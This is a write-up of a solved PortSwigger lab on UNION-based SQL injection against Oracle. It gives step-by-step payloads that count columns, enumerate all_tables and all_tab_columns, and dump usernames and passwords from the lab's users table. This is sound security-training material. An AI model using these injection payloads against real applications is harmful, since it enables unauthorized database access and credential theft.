# Lab: SQL Injection attack, listing the database contents on Oracle

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection — UNION Attacks  
**Difficulty:** Practitioner  
**Status:** ✅ Solved

---

## Objective

Extract administrator credentials by enumerating database tables and columns using UNION-based SQL injection on an Oracle database.

---

## Tools Used

- Burp Suite (request interception & modification)
- Browser

---

## Steps

### Step 1 — Find Number of Columns

Used `ORDER BY` clause to determine how many columns the query returns:

```
' order by 2--
```

No error returned — confirmed query returns **2 columns**.

![Step 1](../images/union-attacks/01-order-by-oracle.png)

---

### Step 2 — Confirm Text Columns

Verified both columns can hold text data:

```
category=Pets' UNION SELECT 'abc','def'--
```

Both columns returned text successfully — UNION attack is possible.

---

### Step 3 — Extract Table Names

Queried `all_tables` to list all tables in the database:

```
' union select table_name,null from all_tables--
```

Found target table: **`USERS_HKTWUJ`**

![Step 3](../images/union-attacks/02_tables1-oracle.jpg)
![Step 3](../images/union-attacks/02_tables2-oracle.png)

---

### Step 4 — Extract Column Names

Queried `all_tab_columns` to find columns inside the target table:

```
' union select column_name,null from all_tab_columns where table_name='USERS_HKTWUJ'--
```

Found columns:
- `USERNAME_SPGKBL`
- `PASSWORD_HQYBJT`

![Step 4](../images/union-attacks/03-columns-oracle.jpeg)

---

### Step 5 — Dump Credentials

Retrieved all usernames and passwords from the table:

```
Tech gifts' union select USERNAME_SPGKBL,PASSWORD_HQYBJT from USERS_HKTWUJ--
```

Successfully retrieved administrator credentials and logged in.

![Step 5](../images/union-attacks/04-credentials-oracle.jpg)

![Lab Solved](../images/union-attacks/05-solved-oracle.jpg)

---

## Key Takeaway

`all_tables` and `all_tab_columns` are the Oracle equivalents of the information schema.  
They store metadata about every table and column — making them the first place to look when enumerating an Oracle database during a SQL injection attack.

**Attack flow:**
```
Find columns → Confirm text → Dump tables → Dump columns → Dump data
```

---

## References

- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP Top 10 — A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
